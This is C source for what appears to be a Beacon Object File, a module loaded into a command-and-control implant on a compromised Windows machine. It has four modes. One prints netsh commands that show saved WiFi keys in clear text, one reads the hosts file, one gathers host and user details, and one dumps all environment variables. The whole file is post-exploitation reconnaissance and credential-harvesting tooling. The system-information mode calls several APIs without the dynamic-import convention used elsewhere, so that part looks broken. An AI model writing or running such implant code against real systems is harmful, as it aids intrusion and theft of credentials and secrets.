#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetEnvironmentVariableA(LPCSTR, LPSTR, DWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetFileSize(HANDLE, PDWORD);
DECLSPEC_IMPORT LPSTR WINAPI KERNEL32$GetEnvironmentStringsA(void);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$FreeEnvironmentStringsA(LPSTR);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError();
DECLSPEC_IMPORT size_t WINAPI MSVCRT$strlen(const char*);

void go(char *args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    
    int mode = BeaconDataInt(&parser);
    
    if (mode == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "=== WiFi Profiles ===");
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Execute on target:");
        BeaconPrintf(CALLBACK_OUTPUT, "    netsh wlan show profiles");
        BeaconPrintf(CALLBACK_OUTPUT, "    netsh wlan show profile name=\"<SSID>\" key=clear");
    }
    else if (mode == 1) {
        HANDLE hFile = KERNEL32$CreateFileA("C:\\Windows\\System32\\drivers\\etc\\hosts", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD fileSize = KERNEL32$GetFileSize(hFile, NULL);
            char buffer[4096];
            DWORD bytesRead = 0;
            if (fileSize < 4095) {
                KERNEL32$ReadFile(hFile, buffer, fileSize, &bytesRead, NULL);
            } else {
                KERNEL32$ReadFile(hFile, buffer, 4095, &bytesRead, NULL);
            }
            buffer[bytesRead] = 0;
            BeaconPrintf(CALLBACK_OUTPUT, "=== Hosts File ===");
            BeaconPrintf(CALLBACK_OUTPUT, "%s", buffer);
            KERNEL32$CloseHandle(hFile);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read hosts file: %d", KERNEL32$GetLastError());
        }
    }
    else if (mode == 2) {
        char computerName[MAX_COMPUTERNAME_LENGTH + 1] = {0};
        DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
        GetComputerNameA(computerName, &size);
        
        char userName[256] = {0};
        DWORD userSize = 256;
        GetUserNameA(userName, &userSize);
        
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        
        MEMORYSTATUSEX mem;
        mem.dwLength = sizeof(mem);
        GlobalMemoryStatusEx(&mem);
        
        BeaconPrintf(CALLBACK_OUTPUT, "=== System Information ===");
        BeaconPrintf(CALLBACK_OUTPUT, "  Computer: %s", computerName);
        BeaconPrintf(CALLBACK_OUTPUT, "  User: %s", userName);
        BeaconPrintf(CALLBACK_OUTPUT, "  Processors: %d", si.dwNumberOfProcessors);
        BeaconPrintf(CALLBACK_OUTPUT, "  Total RAM: %llu MB", mem.ullTotalPhys / 1024 / 1024);
        BeaconPrintf(CALLBACK_OUTPUT, "  Used RAM: %llu%%", mem.dwMemoryLoad);
    }
    else if (mode == 3) {
        BeaconPrintf(CALLBACK_OUTPUT, "=== Environment Variables ===");
        LPSTR env = KERNEL32$GetEnvironmentStringsA();
        if (env) {
            LPSTR current = env;
            while (*current) {
                BeaconPrintf(CALLBACK_OUTPUT, "  %s", current);
                current += MSVCRT$strlen(current) + 1;
            }
            KERNEL32$FreeEnvironmentStringsA(env);
        }
    }
}
